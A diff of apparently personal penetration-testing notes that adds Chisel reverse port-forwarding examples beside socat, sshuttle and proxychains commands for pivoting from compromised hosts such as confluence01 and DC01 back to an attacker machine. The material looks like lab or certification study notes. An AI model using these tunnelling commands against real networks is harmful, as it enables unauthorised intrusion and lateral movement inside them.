@@ -66,9 +66,10 @@ socks5 127.0.0.1 9998(attacker machine)
 1. confluence01: socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22(PGDATABASE01)
 2. kali(attacker machine): sshuttle -r database_admin@192.168.50.63(PGDATABASE01):2222 10.4.50.0/24 172.16.50.0/24
 ```
-###### httptunnel
+###### Chisel
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/0c4201e9-44ae-4d2f-ad93-a5ddb4317f52)
 ```
+Chisel Reverse dynamic Port Forwarding:
 Confluence01: .\chisel.exe client 192.168.45.214:8080 R:socks
 kali(attacker machine): chisel server --port 8080 --reverse/chisel server --port 8080 --socks5 --reverse
 
@@ -78,7 +79,6 @@ disable proxy dns
 sudo proxychains4 -f /etc/proxychains4.conf nmap -sS -Pn -p 80 172.16.243.10
 ```
 
-
 ```
 <local-host>:<local-port>:<remote-host>:<remote-port>/<protocol>
 which shares <remote-host>:<remote-port> from the server to the client as <local-host>:<local-port>
@@ -87,6 +87,7 @@ R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
   which does reverse port forwarding, sharing <remote-host>:<remote-port>
   from the client to the server's <local-interface>:<local-port>.
 
+Chisel Reverse Port Forwarding
 ./chisel server --reverse --port 9002 --socks5.
 chisel.exe client <kaliIP>:9002 R:8090:172.16.22.2:8000
 Now we can access to http://172.16.22.2:8000/ via localhost:8090
@@ -107,6 +108,15 @@ DMZ01:
 
 DC01:
 chisel.exe client 172.16.8.120:9002 R:8888:socks
+```
+
+```
+In local machine
+./chisel server -p 9999 --reverse
+
+In remote machine
+./chisel client 10.0.0.1:9999 R:3000:127.0.0.1:3000 R:8000:127.0.0.1:8000
+After that, we can access to http://localhost:3000 and http://localhost:8000 in local machine.
 ```
 ### Windows Port forwarding
 ###### PLINK.exe
